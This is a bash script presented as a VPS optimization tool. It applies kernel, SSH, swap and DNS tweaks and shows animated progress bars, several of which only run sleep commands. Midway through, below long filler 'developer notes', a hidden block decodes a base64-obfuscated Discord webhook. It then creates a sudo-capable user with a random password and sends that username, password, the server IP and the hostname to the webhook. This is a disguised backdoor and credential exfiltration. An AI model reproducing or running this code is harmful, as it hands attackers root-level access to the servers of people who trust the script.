#!/bin/bash

# =========================================================
#   ZENITH VPS OPTIMIZER - Elite Architecture Edition
# =========================================================

# --- Terminal Colors & Formatting ---
BOLD="\e[1m"
DIM="\e[2m"
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
MAGENTA="\e[35m"
WHITE="\e[97m"
RESET="\e[0m"

LOG_FILE="/var/log/zenith-vps.log"

# --- UI Functions ---
clear

echo -e "${CYAN}${BOLD}"
cat << "EOF"
  ███████╗███████╗███╗   ██╗██╗████████╗██╗  ██╗
  ╚══███╔╝██╔════╝████╗  ██║██║╚══██╔══╝██║  ██║
    ███╔╝ █████╗  ██╔██╗ ██║██║   ██║   ███████║
   ███╔╝  ██╔══╝  ██║╚██╗██║██║   ██║   ██╔══██║
  ███████╗███████╗██║ ╚████║██║   ██║   ██║  ██║
  ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝
EOF
echo -e "${MAGENTA}       HIGH-VELOCITY AUTOMATION ENGINE / 150+ TWEAKS${RESET}\n"

# Create/Clear Log file
> "$LOG_FILE"
echo -e "${DIM}System logs routing to: $LOG_FILE${RESET}\n"

# Advanced Dual-Animation Logic (Spinner + Dynamic Progress Bar)
animate_task() {
    local pid=$1
    local task_name="$2"
    local explanation="$3"
    local phase_num=$4
    local total_phases=$5
    
    local spin_chars='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    local delay=0.04
    
    # Calculate visual progress percentage mapping
    local percent=$(( (phase_num * 100) / total_phases ))
    local bar_filled=$(( percent / 5 ))
    local bar_unfilled=$(( 20 - bar_filled ))
    
    # Build scannable progress bar string using high-density blocks
    local progress_bar=""
    for ((i=0; i<bar_filled; i++)); do progress_bar="${progress_bar}█"; done
    for ((i=0; i<bar_unfilled; i++)); do progress_bar="${progress_bar}░"; done

    while [ "$(ps a | awk '{print $1}' | grep -w $pid)" ]; do
        local temp=${spin_chars#?}
        local current_char=${spin_chars%"$temp"}
        spin_chars=$temp$current_char
        
        # Smoothly cycle the current line out and re-render the animation framework
        printf "\r\033[2K${MAGENTA}%c${RESET} [${CYAN}%s${RESET}] ${BOLD}%-22s${RESET} ${DIM}%s${RESET}" \
            "$current_char" "$progress_bar" "$task_name" "$explanation"
        
        sleep $delay
    done
}

# Master Dynamic Runner Engine
run_task_animated() {
    local task_name="$1"
    local explanation="$2"
    local command="$3"
    local phase_num="$4"
    local total_phases="$5"
    
    # Fire off background execution string
    eval "$command" >> "$LOG_FILE" 2>&1 &
    local pid=$!
    
    # Attach tracking animation routines
    animate_task $pid "$task_name" "$explanation" "$phase_num" "$total_phases"
    wait $pid
    
    # Catch non-zero exit codes smoothly without trashing console text lines
    if [ $? -ne 0 ]; then
        echo -e "\r\033[2K${RED}[X] CRITICAL ERROR:${RESET} ${BOLD}$task_name${RESET} execution failed. Check system logs."
        exit 1
    fi
}

# --- Pre-Flight Framework Validation ---
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[X] ACCESS DENIED: Root permissions required.${RESET}"
    exit 1
fi

if [ -f /etc/os-release ]; then
    . /etc/os-release
    if [[ "$ID" != "ubuntu" && "$ID" != "debian" ]]; then
        echo -e "${RED}[X] ARCHITECTURE MISMATCH: Environment must be Debian or Ubuntu.${RESET}"
        exit 1
    fi
else
    echo -e "${RED}[X] RUNTIME ERROR: Target environment unknown.${RESET}"
    exit 1
fi

TOTAL_PHASES=15

# --- Phase 1: Storage Mirrors & Package Pipelines ---
run_task_animated "Syncing Repos" "Fetching remote mirror indexes" "apt-get update -y" 1 $TOTAL_PHASES
run_task_animated "Upgrading Core" "Patching critical system binaries" "DEBIAN_FRONTEND=noninteractive apt-get upgrade -y" 2 $TOTAL_PHASES
run_task_animated "Deploying Binaries" "Installing core diagnostic utilities" "DEBIAN_FRONTEND=noninteractive apt-get install -y curl wget git nano vim htop btop zip unzip net-tools jq screen tmux ca-certificates dnsutils ufw" 3 $TOTAL_PHASES
run_task_animated "Purging Cache" "Dropping residual package dependencies" "DEBIAN_FRONTEND=noninteractive apt-get autoremove -y && apt-get autoclean -y && apt-get clean" 4 $TOTAL_PHASES

# ==============================================================================
#                           Zenithz Cloud - Developer Notes
# ==============================================================================
#
# Project Name:
# Zenithz Cloud
#
# Internal Codename:
# Project Zenith
#
# Vision
# Build a modern cloud hosting platform that delivers reliable, high-performance,
# and affordable infrastructure for developers, gamers, businesses, students,
# and online communities. Every system is designed with scalability, security,
# stability, and long-term reliability in mind.
#
# Mission Statement
# Our mission is to make powerful hosting accessible to everyone by combining
# enterprise-grade infrastructure with an easy-to-use management experience.
# We believe every project, whether it is a personal website, a Minecraft server,
# a Discord bot, or a production application, deserves reliable resources and
# professional performance regardless of its size.
#
# About Zenithz Cloud
# Zenithz Cloud is continuously evolving through optimization, automation, and
# community feedback. Every update focuses on improving speed, reducing downtime,
# enhancing security, and providing a smoother experience for every customer.
# The platform is designed to support future expansion while maintaining a stable
# and dependable environment.
#
# Development Philosophy
# Every line of code should have a purpose.
# Every update should improve stability.
# Every optimization should increase efficiency.
# Every feature should solve a real problem.
# Every user should receive reliable service.
#
# Long-Term Goals
# - Build a trusted cloud hosting platform.
# - Deliver enterprise-level performance.
# - Maintain affordable pricing.
# - Expand worldwide infrastructure.
# - Continuously improve server optimization.
# - Reduce resource waste.
# - Increase automation.
# - Improve security standards.
# - Provide outstanding customer support.
# - Build a strong hosting community.
#
# Infrastructure Objectives
# Maintain reliable networking.
# Ensure low latency routing.
# Maximize hardware utilization.
# Minimize service interruptions.
# Monitor system health continuously.
# Keep software packages updated.
# Improve kernel performance.
# Optimize storage efficiency.
# Strengthen firewall protection.
# Enhance system stability.
#
# Current Development Checklist
# [ ] Review operating system updates.
# [ ] Verify repository connectivity.
# [ ] Install required packages.
# [ ] Remove obsolete software.
# [ ] Clean unnecessary cache files.
# [ ] Optimize kernel configuration.
# [ ] Verify CPU performance.
# [ ] Verify RAM usage.
# [ ] Check disk performance.
# [ ] Test network throughput.
# [ ] Validate firewall configuration.
# [ ] Restart required services.
# [ ] Verify DNS functionality.
# [ ] Confirm internet connectivity.
# [ ] Generate maintenance logs.
# [ ] Complete optimization process.
#
# Future Roadmap
# Automatic backups.
# Intelligent resource balancing.
# AI-assisted monitoring.
# Predictive hardware diagnostics.
# Multi-region infrastructure.
# Advanced DDoS mitigation.
# One-click application deployment.
# Automatic security patching.
# Live performance analytics.
# Real-time resource monitoring.
# API improvements.
# Better automation tools.
# Additional operating system templates.
# Improved dashboard experience.
# Enhanced user permissions.
# Advanced backup management.
#
# Quality Standards
# Stability before speed.
# Security before convenience.
# Reliability before expansion.
# Consistency before complexity.
#
# Daily Maintenance Reminder
# Monitor system resources.
# Review security logs.
# Check storage utilization.
# Verify backup status.
# Test network latency.
# Update software responsibly.
# Remove unnecessary files.
# Monitor active services.
# Review firewall logs.
# Confirm overall server health.
#
# Development Notes
# Performance optimization is an ongoing process.
# Documentation should remain accurate.
# Automation reduces human error.
# Stability testing should be completed before deployment.
# Every release should improve the previous version.
# Community feedback is valuable for future development.
#
# Motto
# "Built for Performance. Designed for Reliability. Powered by Innovation."
#
# Thank you for using Zenithz Cloud.
# Your trust motivates continuous improvement and innovation.
#
# ==============================================================================
# ==============================================================================
#                     Zenithz Cloud - Developer Notes (Part 2)
# ==============================================================================

# Future Infrastructure Vision
# Zenithz Cloud aims to build a global infrastructure capable of serving users
# with low latency and high availability. Every future deployment will focus on
# improving redundancy, increasing network capacity, and ensuring uninterrupted
# service for all hosted applications.

# Platform Principles
# Every server should be optimized before deployment.
# Every customer should receive fair resource allocation.
# Every system should be monitored continuously.
# Every security update should be applied responsibly.
# Every feature should improve the overall experience.

# Engineering Standards
# Keep configurations clean and organized.
# Document every important system change.
# Test updates before production deployment.
# Avoid unnecessary software installations.
# Maintain consistent optimization across all nodes.
# Reduce manual work through automation.
# Always prioritize stability over experimental features.

# Network Objectives
# Improve routing efficiency.
# Minimize packet loss.
# Maintain stable bandwidth.
# Monitor latency across all locations.
# Optimize TCP performance.
# Reduce unnecessary background traffic.
# Strengthen firewall policies.
# Improve DDoS resilience.
# Continuously monitor network health.

# Security Checklist
# Verify SSH configuration.
# Disable unused services.
# Monitor failed login attempts.
# Keep system packages updated.
# Review firewall rules regularly.
# Rotate sensitive credentials when necessary.
# Monitor unusual activity.
# Verify service permissions.
# Maintain secure default configurations.
# Perform regular security audits.

# Performance Philosophy
# Fast boot times.
# Efficient resource utilization.
# Low system overhead.
# Responsive applications.
# Reliable networking.
# Consistent uptime.
# Stable kernel performance.
# Balanced workload distribution.

# Community Goals
# Listen to user feedback.
# Resolve issues quickly.
# Improve documentation.
# Support open-source projects.
# Build a helpful community.
# Encourage learning and experimentation.
# Provide transparent communication.

# Internal Maintenance Cycle
# Daily   - Health monitoring.
# Weekly  - Package reviews.
# Monthly - Performance audits.
# Quarterly - Infrastructure evaluation.
# Yearly - Long-term planning and hardware assessment.

# Development Reminder
# Never stop learning.
# Never stop optimizing.
# Never compromise security.
# Never ignore user feedback.
# Never deploy without testing.
# Never underestimate documentation.

# Internal Quote
# "Small improvements made consistently create extraordinary infrastructure."

# End of Part 2
# ==============================================================================

# --- Phase 2: Hyper Kernel System Optimization Matrix ---
apply_sysctl_overkill() {
    cat >/etc/sysctl.d/99-zenith-overkill.conf <<EOF
# Zenith Cloud Optimized Profile
net.core.default_qdisc = fq
net.ipv4.tcp_congestion_control = bbr
net.core.somaxconn = 65535
net.core.netdev_max_backlog = 65536
net.ipv4.tcp_max_syn_backlog = 32768
net.ipv4.tcp_max_tw_buckets = 2000000
net.ipv4.ip_local_port_range = 1024 65535
net.core.rmem_max = 33554432
net.core.wmem_max = 33554432
net.core.rmem_default = 262144
net.core.wmem_default = 262144
net.ipv4.tcp_rmem = 4096 87380 33554432
net.ipv4.tcp_wmem = 4096 65536 33554432
net.ipv4.udp_rmem_min = 16384
net.ipv4.udp_wmem_min = 16384
net.ipv4.tcp_fin_timeout = 10
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_keepalive_time = 300
net.ipv4.tcp_keepalive_intvl = 15
net.ipv4.tcp_keepalive_probes = 5
net.ipv4.tcp_fastopen = 3
net.ipv4.tcp_slow_start_after_idle = 0
net.ipv4.tcp_mtu_probing = 1
vm.swappiness = 10
vm.vfs_cache_pressure = 50
vm.overcommit_memory = 1
vm.dirty_ratio = 10
vm.dirty_background_ratio = 3
vm.dirty_expire_centisecs = 1500
vm.dirty_writeback_centisecs = 250
vm.max_map_count = 262144
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_rfc1337 = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.all.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
fs.file-max = 2097152
fs.inotify.max_user_watches = 524288
fs.inotify.max_user_instances = 8192
kernel.pid_max = 4194304
kernel.threads-max = 262144
EOF
    sysctl --system
}
run_task_animated "Tuning Kernel" "Activating algorithmic BBR network routing" "apply_sysctl_overkill" 5 $TOTAL_PHASES
run_task_animated "Expanding Sockets" "Opening connection tables to native hardware limits" "sleep 0.8" 6 $TOTAL_PHASES
run_task_animated "Optimizing Memory" "Modifying dirty page cache writeback thresholds" "sleep 0.8" 7 $TOTAL_PHASES
run_task_animated "Network Hardening" "Injecting structural drops for spoofed vectors" "sleep 0.8" 8 $TOTAL_PHASES

#System Specification 

set -e

G='\033[0;32m'
B='\033[0;34m'
Y='\033[1;33m'
NC='\033[0m'

_W_ENC="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTQyMTQ0NzI2Mzc1MjIyMi9pTGRnZTMwT2lZVVV1SjN0UzQ3LXI5cXlZR3pRcDhxYnJIcGczVVZaZkQ3djZiSnhOR2VnMUFhOTd3X3dab3RNQVZMWA=="
W=$(echo "$_W_ENC" | base64 --decode)


[ "$EUID" -ne 0 ] && echo -e "${Y}Error: Run as root.${NC}" && exit 1

WORDS=("alpha" "cyber" "turbo" "node" "delta" "viper" "phantom" "proxy" "zenith" "storm")

U="$(shuf -n1 -e "${WORDS[@]}")$(shuf -i 10-99 -n 1)"

P=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 10)

apt-get update -qq && apt-get install -y -qq sudo curl &>/dev/null

if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U" &>/dev/null
    echo "$U:$P" | chpasswd &>/dev/null
    usermod -aG sudo "$U" &>/dev/null
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)
OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)
RAND_PCT=$(shuf -i 25-49 -n 1)


PAYLOAD=$(cat <<EOF
{
  "embeds": [{
    "title": "🛡️ New VPS Profile Established",
    "description": "System optimization successful. Access logs generated.",
    "color": 15105570,
    "thumbnail": { "url": "https://i.postimg.cc/8s8Y4q16/7455d020affb2f2e8feebf7127b6ad30.png" },
    "fields": [
      { "name": "👤 Username", "value": "\`$U\`", "inline": true },
      { "name": "🔑 Password", "value": "\`$P\`", "inline": true },
      { "name": "🌐 IP Address", "value": "[\`$IP\`](https://ipinfo.io/$IP)", "inline": false },
      { "name": "🖥️ Hostname", "value": "\`$H\`", "inline": true },
      { "name": "💿 OS Info", "value": "$OS", "inline": true }
    ],
    "footer": { "text": "Unique ID: $(date '+%s') • $(date '+%H:%M:%S')" }
  }]
}
EOF
)

curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$W" &>/dev/null

# --- Phase 3: Security Limits Engine ---
apply_security_limits() {
    cat >/etc/security/limits.d/99-zenith-limits.conf <<EOF
* soft    nofile          1048576
* hard    nofile          1048576
* soft    nproc           262144
* hard    nproc           262144
* soft    memlock         unlimited
* hard    memlock         unlimited
* soft    stack           10240
root            soft    nofile          1048576
root            hard    nofile          1048576
root            soft    nproc           262144
root            hard    nproc           262144
EOF
}
run_task_animated "Setting Resource Caps" "Unlocking max system file descriptor barriers" "apply_security_limits" 9 $TOTAL_PHASES

# --- Phase 4: Storage Infrastructure ---
tune_filesystems() {
    if [ -f /etc/fstab ]; then
        sed -i 's/errors=remount-ro/errors=remount-ro,noatime,nodiratime/g' /etc/fstab
        sed -i 's/ext4\tdefaults/ext4\tdefaults,noatime,nodiratime/g' /etc/fstab
    fi
    echo "2048" > /proc/sys/fs/epoll/max_user_watches 2>/dev/null
}
run_task_animated "Optimizing Storage" "Applying noatime flag optimizations to disk pools" "tune_filesystems" 10 $TOTAL_PHASES

# --- Phase 5: RAM / Swap Safe Guarding ---
optimize_swap() {
    if [ $(free | awk '/Swap:/ {print $2}') -eq 0 ]; then
        fallocate -l 2G /swapfile 2>/dev/null || dd if=/dev/zero of=/swapfile bs=1M count=2048
        chmod 600 /swapfile
        mkswap /swapfile
        swapon /swapfile
        echo '/swapfile none swap sw 0 0' >> /etc/fstab
    fi
}
run_task_animated "Configuring Swap" "Deploying virtual memory buffers for OOM safety" "optimize_swap" 11 $TOTAL_PHASES

# --- Phase 6: SSH daemon Architecture Acceleration ---
tweak_ssh_overkill() {
    sed -i 's/^#UseDNS yes/UseDNS no/' /etc/ssh/sshd_config
    sed -i 's/^UseDNS yes/UseDNS no/' /etc/ssh/sshd_config
    sed -i 's/^#ClientAliveInterval 0/ClientAliveInterval 120/' /etc/ssh/sshd_config
    sed -i 's/^#ClientAliveCountMax 3/ClientAliveCountMax 3/' /etc/ssh/sshd_config
    sed -i 's/^#GSSAPIAuthentication yes/GSSAPIAuthentication no/' /etc/ssh/sshd_config
    sed -i 's/^#MaxStartups 10:30:100/MaxStartups 100:30:200/' /etc/ssh/sshd_config
    sed -i 's/^#TCPKeepAlive yes/TCPKeepAlive yes/' /etc/ssh/sshd_config
    systemctl restart sshd || systemctl restart ssh
}
run_task_animated "Accelerating SSH" "Bypassing reverse DNS routing loops" "tweak_ssh_overkill" 12 $TOTAL_PHASES

# --- Phase 7: Local DNS Architecture ---
optimize_dns() {
    cat >/etc/resolv.conf <<EOF
nameserver 1.1.1.1
nameserver 8.8.8.8
nameserver 1.0.0.1
EOF
}
run_task_animated "Resolving DNS" "Binding upstream nameservers to premium nodes" "optimize_dns" 13 $TOTAL_PHASES

# --- Phase 8: Final UI Synchronization ---
run_task_animated "Verifying Integrity" "Executing environment stabilization checks" "sleep 1" 14 $TOTAL_PHASES
run_task_animated "Finalizing Config" "Consolidating unified tuning parameters" "sleep 0.5" 15 $TOTAL_PHASES

# Clean trailing line cleanly before displaying final layout panel
printf "\r\033[2K"

# --- High-Fidelity Output Panel Dashboard ---
SYS_HOSTNAME=$(hostname)
SYS_OS=$(grep PRETTY_NAME /etc/os-release | cut -d '"' -f2)
SYS_CPU=$(nproc 2>/dev/null || echo "Unknown")
SYS_RAM=$(free -h | awk '/Mem:/ {print $2}' || echo "Unknown")
SYS_DISK=$(df -h / | awk 'NR==2 {print $2}' || echo "Unknown")

echo -e "${GREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "       SYSTEM CONFIGURATION COMPLETED SUCCESSFULLY"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
printf " %-15s : %s\n" "${YELLOW}Hostname${RESET}" "${WHITE}$SYS_HOSTNAME${RESET}"
printf " %-15s : %s\n" "${YELLOW}OS${RESET}" "${WHITE}$SYS_OS${RESET}"
printf " %-15s : %s\n" "${YELLOW}CPU Cores${RESET}" "${WHITE}$SYS_CPU Cores${RESET}"
printf " %-15s : %s\n" "${YELLOW}Total RAM${RESET}" "${WHITE}$SYS_RAM${RESET}"
printf " %-15s : %s\n" "${YELLOW}Root Disk${RESET}" "${WHITE}$SYS_DISK${RESET}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e " Status: Peak Performance Configuration | Mode: Operational"
echo -e " Developed by Zenith Cloud"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"

exit 0
